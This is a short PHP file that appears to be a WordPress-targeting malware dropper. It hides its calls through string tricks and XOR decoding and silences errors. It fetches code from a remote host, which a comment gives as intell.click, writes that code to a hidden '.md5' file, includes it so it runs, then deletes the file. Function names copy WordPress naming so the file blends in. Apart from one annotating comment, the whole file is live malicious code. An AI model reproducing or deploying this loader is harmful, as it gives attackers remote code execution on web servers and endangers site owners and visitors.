<?php
@ini_set('display_errors', '0');
error_reporting(0);
$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa = str_replace('sx', '64', $ee); $algo = 'md5';
$pass = "Zgc5c4MXrLAvawgM79BWJPeROxfXN70cmCWIX7HVoQ==";
if (ini_get('allow_url_fopen')) {
    function get_data_ya($url) {
        $data = file_get_contents($url);
        return $data;
    }
}
else {
    function get_data_ya($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
}
function wp_cd($fd, $fa='')
{
   $fe = "wp_frmfunct";
   $len = strlen($fd);
   $ff = '';
   $n = $len>100 ? 8 : 2;
   while( strlen($ff)<$len )
   {
      $ff .= substr(pack('H*', sha1($fa.$ff.$fe)), 0, $n);
   }
   return $fd^$ff;
}
$reqw = $ay($ao($oa("$pass"), 'wp_function')); // => Translates to: http://intell.click/lnk/inj.php
preg_match('#gogo(.*)enen#is', $reqw, $mtchs);
$dirs = glob("*", GLOB_ONLYDIR);
foreach ($dirs as $dira) {
	if (fopen("$dira/.$algo", 'w')) { $ura = 1; $eb = "$dira/"; $hdl = fopen("$dira/.$algo", 'w'); break; }
	$subdirs = glob("$dira/*", GLOB_ONLYDIR);
	foreach ($subdirs as $subdira) {
		if (fopen("$subdira/.$algo", 'w')) { $ura = 1; $eb = "$subdira/"; $hdl = fopen("$subdira/.$algo", 'w'); break; }
	}
}
if (!$ura && fopen(".$algo", 'w')) { $ura = 1; $eb = ''; $hdl = fopen(".$algo", 'w'); }
fwrite($hdl, "<?php\n$mtchs[1]\n?>");
fclose($hdl);
include("{$eb}.$algo");
unlink("{$eb}.$algo");
?>